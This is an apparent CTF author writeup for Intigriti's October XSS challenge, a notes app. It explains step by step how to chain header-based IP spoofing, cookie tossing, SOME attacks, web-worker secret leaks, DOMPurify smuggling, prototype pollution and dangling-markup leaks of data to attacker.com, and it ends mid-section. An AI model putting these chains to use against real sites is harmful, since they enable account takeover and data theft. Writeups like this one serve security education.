---
layout: post
title: Author Writeup - Intigriti's October XSS Challenge
subtitle: XSS 
cover-img: /assets/img/wsc.jpg
thumbnail-img: /assets/img/wsc.jpg
share-img: /assets/img/wsc.jpg
tags: [xss]
---

# Intigriti's October XSS Challenge - Author writeup :)

> ## <a href="//challenge-1022.intigriti.io">challenge-1022.intigriti.io</a>

---

*This month I created a Hard XSS Challenge for Intigriti. Ended up with Only 1 Official Solve. If you missed it and haven't tried yet, then try to solve yourself before reading the writeup!*


Source Code: https://github.com/0xGodson/notes-app

What is the application is About? 

* Basically it's a notes application. We can create an account and create notes. The source code is also provided. Which means it's a white box challenge. If you read the source code, you can find that this application's authentication is based on IP + JWT [JSON Web Token].
 * Even if someone has your username and password, they can't access your notes! So, there is no options to share your notes with others! 

---

Before We Get Started, lets Check the Rules! 
	<img src="https://i.imgur.com/yTSllvL.png"> 
* This challenge is based on Firefox 
*  This challenge is bit different that usual. We don't need to alert `document.domain`, instead we need to alert the note of the victim. 
* We are allowed to use previous XSS challenges in order to solve this one!
* Popups are Enables! 

--- 

## Let's Jump Into the Technical Details :) 


 *  This application is written in **Node JS** and EJS. Notes are sanitized with **DOMPurify**. 
 *  After successful registration, you can create notes with HTML content. However, since HTML content is sanitized with DOMPurify's latest version, you'd need a DOMPurify 0-day to solve the challenge or something different
	 <img src="https://i.imgur.com/z64zaIA.png"> 
	 
 * If we navigate to `/challenge/begin`, we can see all of our posts 
 
	 <img src="https://i.imgur.com/XZRgLz9.png"> 
* If you we click on one of our Notes, we notice the URL format change to `/challenge/view/<POST-UUID>`
	  		
	 <img src="https://i.imgur.com/FizOLgP.png"> 
* We also notice there is not CSRF Protection and the cookies are set to `SameSite: Strict`. So, the cookie will not be sent by the browser if the request is made from cross-origin. If you are not familiar with `SameSite` or don't know the difference between `Same-Origin` and `Same-Site`, before continuing to read, I would highly recommend you to read this <a href="https://jub0bs.com/posts/2021-01-29-great-samesite-confusion/">blog</a> by <a href="https://twitter.com/jub0bs">jub0bs</a> . 

* Since we are allowed to use previous XSS Challenges, we can bypass `SameSite: Strict`. Because, `challenge-xxxx.intigriti.io` and `challenge-1022.intigriti.io` are `SameSite` But `Cross Origin`. Since, both are `SameSite`, the browser will be happy to send the cookies in HTTP requests. 

* To create a note, we need to send a POST request to `/challenge/add` with a secret. This secret acts like a CSRF token. 

	<img src="https://i.imgur.com/BmYmOsN.png"> 

* How does the front-end gets this secret? 
* There is a javascript file named `getSecret.js` which is a dynamic JavaScript file that shares the valid `secret` to the front-end. 

	<img src="https://i.imgur.com/wp8ww7r.png"> 

* Backend code responsble for returning the secret: 

```js
app.get('/challenge/getSecret.js', isAuthed, (req, res) => {
	try {
		if (db.users[currentUser]['ip'] !== userIP) {
			return  res.redirect('/challenge/auth?alert=Illegal Access!');
		}
		const  script = `
		/* Only Share the Secret if the Host is Trusted! */
		if (window.saveSecret) {
			if (document.domain === 'challenge-1022.intigriti.io' && window.location.href === 'https://challenge-1022.intigriti.io/challenge/create') {
				console.log('secret Sent!');
				window.saveSecret('${db.users[currentUser]['secret']}');
			}
		}`
		res.setHeader('content-type', 'text/javascript');
		res.send(script);
	} catch {
	res.send('Something Went Wrong');
	}
})
```

* `isAuthed` is middleware that is called at the begining.[ `.../getSecret.js',isAuthed,...`] 
* Lets have a look at `isAuthed`

```js
// Verify if the User is Authenticated!
isAuthed = async (req, res, next) => {
	let  headers = req.headers;
	for (let  i  in  headers) {
		if (i.toLowerCase().includes('x-') || i.toLowerCase().includes('ip') 
		|| i.toLowerCase().includes('for')) {
			if (i.toLowerCase() !== 'x-real-ip') { // nginx configuration
				delete  req.headers[i];
			}
		}
	}
	if (!req.headers['cookie']) return  res.redirect('/challenge/auth');
	try {
		const  authToken = req.cookies['jwt'];
		jwt.verify(authToken, jwtSecret, {}, (err, user) => {
		if (err) return  res.redirect('/challenge/auth')
		if (user && db.users[user.user]) {
			currentUser = user.user;
			userIP = RequestIp.getClientIp(req);
			next();
		} else {
			res.redirect('/challenge/auth?alert=user not found');
		}
		})
	} catch (e) {
		res.redirect('/challenge/begin?alert=Something Went Wrong!');
	}
}
``` 

* `isAuthed` middleware basically checks... 
	*  The request headers. It deletes the header if it starts with `x-` or if it includes either `ip` or `for`. There's one exception: `x-real-ip`. This header remains. But why isn't `x-real-ip` deleted? The challenge is Running behind Nginx and Nginx forwards the real ip-address of the user via the `x-real-ip` header. You can't overwrite the `x-real-ip`. 
	* Then, it tries to verify the `JWT` token. 
	* If the token is valid, it sets the `userIP` to our IP. 
	* If the token is not valid, we will be redirected to `/challenge/begin` with the message `Something Went Wrong`. 
	*  So, `/challenge/getSecret.js` is an authenticated endpoint and it requirs a valid `JWT` token. 
	* If we can somehow found a way to leak `secret`, we can perform CSRF! 

--- 

>## Theme Page (`/challenge/theme`)

```js
app.get('/challenge/theme', isAuthed, (req, res) => {
	try {
		if (db.users[currentUser].ip !== '127.0.0.1') {
			res.redirect('/challenge/begin?alert=Themes Under Construction');
		}

		function  replaceSlash(str) {
			return  str.replaceAll('\\', '');
		}

		if (req.query.callback) {
			if (/^[A-Za-z0-9_.]+$/.test(req.query.callback)) {
				if (req.query.backgroundTheme && req.query.colorTheme) {
					if (/^[#][0-9a-z]{6}$/.test(req.query.backgroundTheme) && /^[#][0-9a-z]{6}$/.test(req.query.colorTheme)) {
					return  res.render('theme', {
						theme: {
						callback:  req.query.callback,
						background:  replaceSlash(req.query.backgroundTheme),
						font:  replaceSlash(req.query.colorTheme)
						}
					})
					} else {
						return  res.render('theme', {theme:  false})
					}
				}
				if (req.query.backgroundTheme) {
					if (/^[#][0-9a-z]{6}$/.test(req.query.backgroundTheme)) {
						return  res.render('theme', {
						theme: {
						callback:  req.query.callback,
						background:  replaceSlash(req.query.backgroundTheme)
						}
					})
					} else {
						return  res.render('theme', {theme:  false})
					}
				}
				if (req.query.colorTheme) {
					if (/^[#][0-9a-z]{6}$/.test(req.query.colorTheme)) {
						return  res.render('theme', {
						theme: {
						callback:  req.query.callback,
						font:  replaceSlash(req.query.colorTheme)
						}
						})
					} else {
						return  res.render('theme', {theme:  false})
					}
				}
			}
		} else {
			return  res.render('theme', {theme:  false})
		}
	} catch {
		res.redirect('/challenge/begin?alert=Something went Wrong')
	}
})
```


* The above code will be executed when someone tries to access the `/challenge/theme` page. This endpoint is behind the same `isAuthed` middleware, so the user needs to be authenticated to access this page. 

```js
if (db.users[currentUser].ip !== '127.0.0.1') {
	res.redirect('/challenge/begin?alert=Themes Under Construction');
}
```

* Additionaly, Here it checks if the user's **IP** is **127.0.0.1** or not. If it's not localhost, then we'll be redirected to `/challenge/begin` with an error msg `Themes Under Construction`. 
* If you look closely, the **IP** is **not** checked from this request packet/body, but it checks the IP-address of the user which is stored in the **DATABASE**! 
* Thus, if we somehow manage to spoof the IP while creating an account, then we can create a account with IP *127.0.0.1* and access this page. 
* The application is using `@supercharge/request-ip` library to get the IP-address! 
* If you look into the source code of `@supercharge/request-ip` or read their README.md file, you can find a bypass!
> README file 


<img src="https://i.imgur.com/VVqPyWc.png"> 
	
	
* The application is using the `x-real-ip` header to get the IP of the user

```js
// isAuthed Middleware
for (let  i  in  headers) {
	if (i.toLowerCase().includes('x-') || i.toLowerCase().includes('ip') || i.toLowerCase().includes('for')) {
		if (i.toLowerCase() !== 'x-real-ip') { // nginx configuration
			delete  req.headers[i];
		}
	}
}
```

 * But the library will check HTTP Headers from the Request Body for IP address at first place in the order mentioned in docs. Because Some Applications maybe Behind Some proxies where the proxies forwarard the read IP of the user via Request Body Headers.

>## Register / Login Route 

```js
app.post('/challenge/auth', (req, res) => {
	try {
		delete  req.headers['x-forwarded-for'];
		delete  req.headers['x-client-ip'];
		const  headers = req.headers;
		for (let  i  in  headers) {
			if (i.toLowerCase().includes('x-') || i.toLowerCase().includes('ip') || i.toLowerCase().includes('-for')) {
				if (i.toLowerCase() !== 'x-real-ip') {
					delete  req.headers[i];
				}
			}
		}
		if (!req.body.username || !req.body.password) {
			return  res.redirect('/challenge/auth?message=username or password is empty');
		}
		if (db.users[req.body.username] && db.users[req.body.username].password === req.body.password) {
			if (db.users[req.body.username]['ip'] === RequestIp.getClientIp(req)) {
			const  authToken = jwt.sign({user:  req.body.username}, jwtSecret)
				res.setHeader('Set-Cookie', [`jwt=${authToken}; HttpOnly; secure; SameSite=Strict`]);
				return  res.redirect('/challenge/begin?message=Login Success!');
			} else {
				return  res.redirect('/challenge/auth?alert=Illegal Access!');
			} 
		}
		if (db.users[req.body.username] && db.users[req.body.username].password !== req.body.password) {
			return  res.redirect('/challenge/auth?alert=Password Wrong!');
		}
		if (!db.nonces[RequestIp.getClientIp(req)]) {
			db.nonces[RequestIp.getClientIp(req)] = crypto.randomBytes(20).toString('hex');
		}
		db.users[req.body.username] = Object.create(null);
		db.users[req.body.username]['password'] = req.body.password;
		db.users[req.body.username]['ip'] = RequestIp.getClientIp(req);
		db.users[req.body.username]['secret'] = crypto.randomBytes(20).toString('hex');
		const  authToken = jwt.sign({user:  req.body.username}, jwtSecret);
		db.users[req.body.username].posts = [];
		res.setHeader('Set-Cookie', [`jwt=${authToken}; HttpOnly; secure; SameSite=Strict`]);
		res.redirect('/challenge/begin?message=Account Created!');
	} catch {
	res.redirect('/challenge/begin?alert=Something went Wrong');
	}
})
```

 * I am not going to go into every line, but basically the application deletes 2 Request Headers before Processing the Request. `x-forwarded-for` and `x-client-ip`. 
* Then, the application checks if the request header contains character `x-` or `ip` or `-for`, and if the header contains any of the above 3 words, then it will delete that header (with the exception of `x-real-ip`). 
* Every header mentioned in `@supercharge/request-ip` will fall under this condition and will be deleted, besides the `forwarded` header. This can bypass the check, because `"forwarded".includes("-for")` is false. 
* So, now we can spoof our IP with the `Forwarded` Header while registering the account! 
* What next? Lets try to access `/challenge/theme` with the cookie of the account with the spoofed IP! 

<img src="https://i.imgur.com/LrU7kgb.png"> 


* Yes! We can access the `theme` page now! But sadly we can't use this cookie to create note or anything. Because, every authenticated endpoint other than `/challenge/theme` checks the IP of the user from the request body and verifies if the IP from the request body and IP in the databased are the same. 

```js
if (db.users[currentUser]['ip'] !== userIP) {
	return  res.redirect('/challenge/auth?alert=Illegal Access!');
}
```

* What is `userIP`? It's a global variable that carries the user's IP address which is taken from request body! Can't we use the `Forwarded` Header here to bypass this? Well, if we take a look into `isAuthed` middleware, 

```js
for (let  i  in  headers) {
	if (i.toLowerCase().includes('x-') || i.toLowerCase().includes('ip') || i.toLowerCase().includes('for')) {
		if (i.toLowerCase() !== 'x-real-ip') { // nginx configuration
			delete  req.headers[i];
		}
	}
}
```

* It check if the header contains `x-` or `ip` or `for` words. So, `"forwarded".included("for")` == `true`. So, we can't really use the `Forwarded` header in authenticated endpoints. 
* So, what now? Let's focus on the `theme` page

--- 

>## Callbacks in `/challenge/theme` 

* The `Theme` page is pretty straight forward after checking the user IP from DB: 
```js
function  replaceSlash(str) {
			return  str.replaceAll('\\', '');
		}
if (req.query.callback) {
	if (/^[A-Za-z0-9_.]+$/.test(req.query.callback)) {
		if (req.query.backgroundTheme && req.query.colorTheme) {
			if (/^[#][0-9a-z]{6}$/.test(req.query.backgroundTheme) && /^[#][0-9a-z]{6}$/.test(req.query.colorTheme)) {
			return  res.render('theme', {
				theme: {
				callback:  req.query.callback,
				background:  replaceSlash(req.query.backgroundTheme),
				font:  replaceSlash(req.query.colorTheme)
				}
			})
			} else {
				return  res.render('theme', {theme:  false})
			}
		}
		if (req.query.backgroundTheme) {
			if (/^[#][0-9a-z]{6}$/.test(req.query.backgroundTheme)) {
				return  res.render('theme', {
				theme: {
				callback:  req.query.callback,
				background:  replaceSlash(req.query.backgroundTheme)
				}
			})
			} else {
				return  res.render('theme', {theme:  false})
			}
		}
		if (req.query.colorTheme) {
			if (/^[#][0-9a-z]{6}$/.test(req.query.colorTheme)) {
				return  res.render('theme', {
				theme: {
				callback:  req.query.callback,
				font:  replaceSlash(req.query.colorTheme)
				}
				})
			} else {
				return  res.render('theme', {theme:  false})
			}
		}
	}
}
```



* The application looks for 3 `GET` Parameters. `callback`, `backgroundTheme` and `colorTheme`. 

* And the regex is very restrictive. The `callback` parameter should match `/^[A-Za-z0-9_.]+$/`. That means: only letters, numbers, underscores and dots are allowed. No special characters at all. You can't bypass this. 

* `backgroundTheme` and `colorTheme` parameters are similar. They need to satisfy the regex. Which means the length should be 6 chars, must start with `#` and can contain letters and numbers. No Special Characters! 

>### How does the theme functionality work?


* If the parameters satisfy the regex, then it's passed to `res.render('theme',{theme:{...}})` 

* This Application using EJS Template Engine and if you look into the `theme.ejs`, 

<img src="https://i.imgur.com/q6vVCxl.png">

* It responds with `opener.<callback>("...","...")` and it's inside a script tag. 
* Here `opener` is the challenge window. 
	<img src="https://i.imgur.com/skiAiTs.png"> 
* If you click the Little Icon there, it will call `updateTheme` function 
```js 
function updateTheme() { 
	window.open("/challenge/theme"); 
} 
``` 

* which basically opens another window with url `/challenge/theme`. So `/challenge/theme` can access the parent with `opener` method. You can read about it <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/opener">here</a> 

* We can Control the `opener.<callback>()` in `theme` page. So, now we have limited access to the parent page! 

<img src="https://i.imgur.com/FSPfXBe.png"> 

* We can call functions with limited arguments from child to opener, but still we need to do something to make sure our cookie works for whole application.Here, We are using the cookies which we created with spoofed IP and every other authenticated endpoints other than `challenge/theme` checks the user ip from the request body and verifies with the ip stored in database! 

>## Cookie Tossing! 

* Cookie Tossing is a kind of attack where we set cookies from `a.test.com` to all subdomains. Like if we set cookie from `a.test.com` with `domain` attribute = `.test.com` or `test.com`, cookies are shared with all subdomains. 

* Since `intigriti.io` is not in the public sufix list, we can set a malicious cookie from `xxx.intigiriti.io` and which is shared to all of the subdomains. we just need an xss anywhere on `*.intigriti.io`. We can get that from previous challenges. 

```js
// xss on chal-0222.intigriti.io

https://challenge-0222.intigriti.io/challenge/xss.html?q=%3Cstyle/onload=eval(uri)%3E&first=yes\n
document.cookie = `jwt={cookie_with_spoofed_ip};domain=.intigriti.io;path=/challenge/theme`;
```

* why `path` attribute? RFC 6265 says, 


<img src="https://i.imgur.com/7ihNRtD.png"> 


* Got it? ` Cookies with longer paths are listed before cookies with shorter paths.` So, in our case, we are setting cookie with path `/challenge/theme`. So while browser sends the request to `*.intigriti.io/challene/theme`, our spoofed cookie will be sent before the real cookies. So, the Application will still work fine after tossing the cookies! Because, the browser will use the real cookie for other paths! 
* So, now we can enable the `theme` page for our victim and that means the victim account can access `/challenge/theme` page!

 --- 

>## SOME Attack [SAME ORIGIN METHOD EXECUTION] 

* We can use Same origin Method Execution in `/challenge/theme`. You can read more about this attack <a href="https://www.someattack.com/Playground/About">here</a> 
* Example:


```html
// index.html
// here some.html is child
<script>
window.open("/some.html");
location.replace("https://<website_which_allow_you_to_control_opener_in_response>/<endpoint_which_you_want_to_access>");
</script>

// some.html
// here index.html is the parent. we can access index.html with `opener` method and we can access the dom if both are same origin. 
<script>
location.replace("https://<website_which_allow_you_to_control_opener_in_response>/<endpoint_where_you_can_control_the_opener_with_callback_paramater>?callback=alert")
</script>

```
* Why location.replace and why this help us? 

> from stackoverflow

 <img src="https://i.imgur.com/UFMag0f.png"> 

* So, even after chaning the window location, we can continue the parent / child relation among windows. but if we used document.location = `something` or window.location = `something`, the relation among 2 windows will be erased from memory 

## SOME to Click Elements 

* What can we achive with the SOME attack? We can call any functions! So, we can also click elements! 

* For example, We have SOME on `theme` page and we can click elements with javascript. We can call `Element.click()` to click something in javascript. In our case we don't need to call the function, which is already called in response `opener.<callback>()`! 

* Example: 
<img src="https://i.imgur.com/gF52pAx.png"> 

```js
document.body.lastElementChild.firstChild.nextElementSibling.firstChild.nextElementSibling.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.lastChild.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.firstChild
```

* Here, We can use DOM Navigations to navigate across elements in document.body. To learn more about dom navigation, click <a href="https://javascript.info/dom-navigation">here</a> 

## Limited POC to click the First Post where the Flag is Saved: 

We need to use xss from previous challenges to do all there things 

* Enabling themes page for victim - 
	* `document.domain=jwt={spoofed};domain=.intigriti.io;path=/challenge/theme`; 
* Frame 1 -

```html
<script>
window.open("https://attacker.com/frame2.html")
location.replace("https://challenge-1022.intigriti.io/challenge/begin");
</script>
```

* Frame2.html - 

```html
<script>
// run this after 2 seconds.
location.replace("https://challenge-1022.intigriti.io/challenge/theme?callback=document.body.lastElementChild.firstChild.nextElementSibling.firstChild.nextElementSibling.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.lastChild.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.firstChild.click&backgroundTheme=%2340e0d0");
</script>

// example response from the server for `/challenge/theme`

...
<script>
opener.document.body.lastElementChild.firstChild.nextElementSibling.firstChild.nextElementSibling.firstElementChild.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.nextElementSibling.lastChild.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.previousElementSibling.firstChild.click("#40e0d0")
<script>
...
```

* So, Now the frame1 is navigated to the note where the flag is Stored! 
* So, what's next? Can we just create a note with XSS? As we discussed about, to create note, we need know the correct `secret` to create a note with CSRF. 
* But How can we Leak the Secret? Well, This is the main part of the challenge :D 

## Leaking the Secret aka CSRF Token to Perform CSRF 

* Lets Look into the code and see how the secret is created! 
<img src="https://i.imgur.com/sJ4L3HW.png"> 

* The secret is created and Stored in the Database while the account is created. `secret` is constant for every account. Every different account has a different secret. 
* So, there is no way we can guess the `secret` 
<img src="https://i.imgur.com/xEfCirC.png"> 

```js
/* Only Share the Secret if the Host is Trusted! */
if (window.saveSecret) {
	if (document.domain === 'challenge-1022.intigriti.io' && window.location.href === 'https://challenge-1022.intigriti.io/challenge/create') {
		console.log('secret Sent!');
		window.saveSecret('some_secret');
	}
}
```

* So, the secret is only shared if the document.domain is `challenge-1022.intigriti.io`and window.location.href is `https://challenge-1022.intigriti.io/challenge/create`. 
* It seems unexploitable, but you can use `WebWorkers` to bypass this check! 
* What are WebWorkers? 
> MDN says 


<img src="https://i.imgur.com/weCttRS.png">


* So, Yaa! There is no window/document object present in `Web Worker` API. So, we can write our own window/document objects there 😎 

```js
// worker.js

window = {}
window.location = {}
document = {}

// send the secret to top window!
window.saveSecret = function(msg){  
	self.postMessage(msg)  
}

window.location.href = "https://challenge-1022.intigriti.io/challenge/create";
document.domain = "challenge-1022.intigriti.io";

// we can use importScripts function from API to import external scripts!
importScripts("https://challenge-1022.intigriti.io/challenge/getSecret.js");
```

* That's all? If we try to register a Web Worker, then... 


<img src="https://i.imgur.com/0Wt7rhl.png"> 



* We ran into another issue, we can't register a worker script that lives on cross origin! 
* Ok, maybe we can try this on our attacker domain and then share the secret with the old xss challenge page in order to perform csrf.
* We can, But the issue is Cookies are `SameSite: strict `. So, auth cookies won't be sent by the browser while importing scripts with `importScripts` from cross origin!
 * How can we bypass the browser restriction? Well, to overcome this error, we need a file that is stored on the same domain where we have xss. For example, if we are exploiting the xss in `challenge-0220.intigriti.io` to bypass this samesite stuff, we need to store our worker script in `challenge-0220.intigriti.io` to use. 
* But we don't have any options to do that! 

--- 


## Blob URL Objects for Rescue 

* What is Blob URL and Why its used? Blob URL/Object URL is **a pseudo protocol to allow Blob and File objects to be used as URL source for things like images, download links for binary data and so forth**. For example, you can not hand an Image object raw byte-data as it would not know what to do with it. 

* We can create a Blob url to bypass this. Like enabling CORS in attacker controled domain. Then using fetch api to get the worker script. Then we create a blob url for that file. 

* Example blob url: blob:**https://\<document.domain\>/550e8400-e29b-41d4-a716-446655440000** 

* If we pass the blob url as URL to `new Worker(BlobURL)`, then the browser is happy to register the worker :) 
> Example poc: 


```js
function registerWorker(url) {  
	const worker = new Worker(url);  
	// EventListener to receive msg from worker.js
	worker.addEventListener('message', function (m) {  
		const secret = m.data;  // secret
		console.log(`Found secret: '${secret}'`);  
	});  
}

fetch(`https://attacker.com/worker.js`)  
.then(e => e.text())  
.then(e => {  
	const blobUrl = URL.createObjectURL(new Blob([e], {type: 'text/javascript'}));  
	registerWorker(blobUrl); // passing Blob Url as URL to Bypass Browser restriction  
});
```

## XSS 
 
*  We already know how to leak the secret and assuming we have the secret, now we can perform csrf and add another note, then we use `SOME` in `/challenge/theme` to click the second post with DOM navigations. 
* But there is no xss. Note Title and Note body are sanitized using `DOMPurify` in the latest version. So no XSS. 
* if we looked at the last part of client-side javascript file - `/app.js`


```js
Object.whoami = Object.create(null);
if(document.domain.match(/localhost/)){
	Object.whoami = {type:  "admin"};
	Object.whoami.markdown = true;
}else{
	Object.whoami = {type:  "normal-user"};
}
Object.defineProperty(Object.whoami,'type', {configurable:false,writable:false}); // no overwrite!
try{
	Object.whoami.user = document.head.innerText.split("Welcome")[1].replaceAll("\n", "").replaceAll(" ", "");
}catch{
	Object.whoami.user = "still!"
}
``` 

* First, the application creating a Object on `Object` with `Object.create(null)`; 
* `Object.create(null)` will create a Object with prototype set to `null`. If you don't know about prototype pollution, I had already written a Blog on <a href="https://blog.0xgodson.com/2022-06-03-intigriti-may-chal/">Prototype pollution.</a> 
* If the document.domain contains `localhost` in it, then Object.whoami.type is set to admin and Object.whoami.markdowm is set to true. Else, Object.whoami.type is set to "normal-user"; 
* `Object.defineProperty(Object.whoami,'type', {configurable:false,writable:false});` {configurable:false,writable:false} is a method to freeze a property of a object, after assigning values, we can't overwrite. 


> Example 

```
a = {}
a.name = "godson"
a.age = 18;
console.log(a.age); // 18
Object.defineProperty(a,'age',  {configurable:false,writable:false});
a.age = 1337;
console.log(a.age); // still 18
```

* Lets look at how the Notes are rendered!


```js
app.get('/challenge/view/:uuid', isAuthed, (req, res) => {
// no xss :)
function  noscript(text) {
return  text.toLocaleLowerCase().replaceAll('script', '').replaceAll('nonce', '');
}
try {
	if (db.users[currentUser]['ip'] !== userIP) {
		return  res.redirect('/challenge/auth?alert=Illegal Access!');
	}
	let  uuid = req.params.uuid;
	const  posts = db.users[currentUser].posts;
	if (!posts.includes(uuid)) {
		return  res.redirect('/challenge/begin?alert=Note not Found!');
	}
	res.setHeader('Content-Security-Policy', `script-src 'nonce-${db.nonces[RequestIp.getClientIp(req)]}';base-uri 'self'; style-src 'self' 'unsafe-inline'; img-src *;default-src 'none';object-src 'none';`)
	res.render('view', {
		title:  db.users[currentUser][uuid]['title'],
		body:  db.users[currentUser][uuid]['body'],
		user:  noscript(currentUser),
		nonce:  db.nonces[db.users[currentUser]['ip']]
	})
} catch {
	res.redirect('/challenge/begin?alert=Something went Wrong');
}
});
```

* First the application make sures the user's IP is the same in the request body and Database. Then it fetches all the posts created by the user and checks if the requested `postID` is present or not. If yes, then its setting the CSP here! 

```js
res.setHeader('Content-Security-Policy', `script-src 'nonce-${db.nonces[RequestIp.getClientIp(req)]}';base-uri 'self'; style-src 'self' 'unsafe-inline'; img-src *;default-src 'none';object-src 'none';`)
```

* If we look closely at the application code, the `nonce` is same for every ip. If a single `ip` has multiple accounts, the `nonce` is shared among them, but the `secret` different for every account
```js

// app.post('/challenge/auth') route
if (!db.nonces[RequestIp.getClientIp(req)]) {
	db.nonces[RequestIp.getClientIp(req)] = crypto.randomBytes(20).toString('hex');
}
```

* Every authenticated page is protected with CSP `scipt-src 'self'`, only `/view/<POST_UUID>` had a CSP with `script-src 'nonce-{not_random_for_sure}'`. So, for XSS we need to upload our javascript file to the server, else we need to somehow leak the nonce and use that on `/view/<post_id>` for xss! 
* But our input is sanitized with `DOMPurify`, how can we get xss? If we looked into the `view.ejs`, 


<img src="https://i.imgur.com/rfaTwJR.png"> 


* We can see under some conditions, our note content is passed into another function called `tryMarkDown` which basically looks for `<mk>` in note content and `</mk>` and strip the content between this 2 tags and rendering as markdown. What can go wrong? Our input is already Sanitized by `DOMPurify`, but here under some conditons, our input is parsed again as markdown. 
* Basically We can do something like mxss. But its not actually MXSS, but some kind of Mxss :) 
* Some Facts about DOMPurfiy, 
	* DOMPurify only allow a tag or attribute is DOMPurify knows about it. 
	* If unknow tags or attributes is present in the string, then those tags/attribute will be removed. 
	*  so, tags like `<mk>hey</mk>` will be removed by dompurify! 


<img src="https://i.imgur.com/XRlfoVM.png">


	 * we can smuggle our `<mk>` tags inside know attributes! 
<img src="https://i.imgur.com/dBQXxo4.png">


 * By this method, we smuggle our xss payload inside know attributes! Inspired by - https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e 


> Example POC:

```html
// our note body!

`<h1 id="`payload<img src=x onerror=alert()>"></h1>
// after dompurify :)
'`<h1 id="`payload<img src=x onerror=alert()>"></h1>'
..`<h1 id="`payload">xss<h1>
// If we Again parsed the output with markdown parser
..<p><code>&lt;h1 id=&quot;</code>payload<img src=x onerror=alert()>&quot;&gt;</h1></p>
```

* Payload Executed Successfully [CSP error :)] 
<img src="https://i.imgur.com/PrYb9fO.png"> 

* So, for xss, If we Leaked the `nonce` somehow, we can use `<iframe srcdoc="<script nonce='leaked_nonce'>alert(1337)</script>">`

## Leaking the GUID and Nonce! 

* We already know how to leak the secret, But how leak the nonce? nonce is constant for single ip and and different for every ip. 
* Before going into the leaking part, lets see what we need to do to satisfy the checks and make our note body to parse 2nd time? 

```js
if(document.querySelectorAll("#usertype")[0].getAttribute("type") === "admin" && Object.whoami.type === "admin" && Object.whoami.markdown === true && Object.type === "admin" ){
	tryMarkDown()
}
```


* To make `document.querySelectorAll("#usertype")[0].getAttribute("type")` === `admin`, we can try dom clobbering! by default, every user have a body tag `<body id="usertype" type="normal-user" className="snippet-body">` with id setted to `usertype` and `type=normal-user` in the response. 

* `querySelectorAll` follows the DOM tree order to align the elements when morethan one element have same id attribute. So, the only one element which comes above the `body` element in DOM order is `html` element. 
* So, we need html element with id=`usertype` and type=`admin` to make this (`document.querySelectorAll("#usertype")[0].getAttribute("type")` === `admin`) true. 
* Again DOMPurify don't allow `html` element. So, we need some other way. 
* Every Authenticated Pages carries the Username of the user in `title` tag without **escaping html** 


<img src="https://i.imgur.com/HCwhVcR.png"> 


* But, the Username is Filtered used a function named `noscript` before rending, 


```js
function noscript(text) { 
	matches = text.toLowerCase().match(/(script)|(nonce)|(href)|(getsecret)|(ip-secret)|(form)|(input)|(nonce)/) 
	if(matches === null){ 
		return text 
	}else{ 
		return  "[NO XSS]" 
	} 
}
```

Edit: Still it is possible to Bypass this with `noscript` with `iframe` srcdoc with HTML Entities! Some Folks done this

* If the Username contains any of the above words, then username will not be rendered directly and rendered as `[NO XSS]`. 
* So, we can use limited HTML in `username`. 
* If we used a username like `</title><html id=usertype type=admin>random` 


<img src="https://i.imgur.com/gH3Ke3c.png"> 



* we can bypass the first check! to bypass `Object.whoami.type === "admin" && Object.whoami.markdown === true && Object.type === "admin"` we need prototype pollution! Indeed, the application is using arg.js - v1.4 for parsing query string and its vulnerable to prototype pollution! 

* `https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md` Here is the vulnerable code and we can also see, BlackFan mentioned few payloads for us and we can try! 
* If we pass `?constructor[prototype][test]=test` as query string, we can confirm, we have prototype pollution here! <img src="https://i.imgur.com/wxYewpJ.png"> 
* Now, If we try to pollute / overwrite `Object.whoami.type`, you can't! because, its configured as read only! `Object.defineProperty(Object.whoami,'type', {configurable:false,writable:false});` 


<img src="https://i.imgur.com/gikZ4Am.png"> 



* If you remember, few months back, the one and only legend `gareth heyes` wrote a 
<a href="https://portswigger.net/research/widespread-prototype-pollution-gadgets">blog</a> on prototype pollution gadgets. 

	* `ES5 functions such as Object.defineProperty are vulnerable - if a developer does not specify a "value" property, then prototype pollution sources can be used to overwrite properties!` 

* So, If we pollute `Object.prototype.value`, we can overwrite `Object.whoami.type` which is configured read only with `Object.defineProperty`! 


<img src="https://i.imgur.com/zjSauHv.png"> 


* we also need to set `Object.whoami.markdown` === `true` and `Object.type`===`admin`! We can't write `markdown` inside `Object.whoami` but we can set `Object.prototype.markdown = true`. Since `Object.whoami` is a Object and its prototype is `Object.prototype`. So in prototype chain, we can get `Object.whoami.markdown === true`. To set `Object.type = admin`, we don't want to get into `constructor[prototype]` chain , we can just pollute `Object.type` with `?constructor[type]=admin` :) <img src="https://i.imgur.com/Fdf1beW.png"> 

> Payload for Prototype Pollution:  `?constructor[prototype][value]=admin&constructor[prototype][markdown]=true&constructor[type]=admin` [ Note: `Username: </title><html id=usertype type=admin>r4nd0m`] 

* So, Now its time to leak the nonce! we can use a technique called `Dangling Markup Injection`! Chrome had fixed this issue in past but firefox didn't fixed this. You can learn more <a href="https://portswigger.net/web-security/cross-site-scripting/dangling-markup">here</a> 
* If we use a username like `</title><img src='//attacker.com?leak=`, then everything before the next `'` will be considered as the URL. <img src="https://i.imgur.com/ciyahvJ.png"> 
* Here the user name is `</title><img src='//attacker?leak=` 
<img src="https://i.imgur.com/cv3dqxp.png"> 

* We can see, Our injection worked here! But a `nonce` based csp is only found in `/view/<POST_ID>` so we need to create a Dumy Post on this account. 
* To create Dummy Note, we need `secret`! We can follow the same steps to leak the secret again! After Leaking the secret, we can create a dummy note. Then we create a iframe with src=`//challenge-1022.intigriti.io/challenge/begin` which will leak the `POST_ID/Note_ID`. 

<img src="https://i.imgur.com/XRaVVDm.png"> 

* After Leaking the Note_ID/Post_ID, now we can create another frame to with src = `//challenge-1022.intigriti.io/challenge/view/<leaked_id>` which leaks the nonce! 

<img src="https://i.imgur.com/Hf4Ht9y.png"> 


* Now, we have all the pieces of the puzzle. We just need to align them. 

--- 

## Chaining all together! 

* First we need to open the first note of the vitim. To do that, 
* First, we need to perform cookie tossing with the spoofed IP to enable `theme` page for victim. 
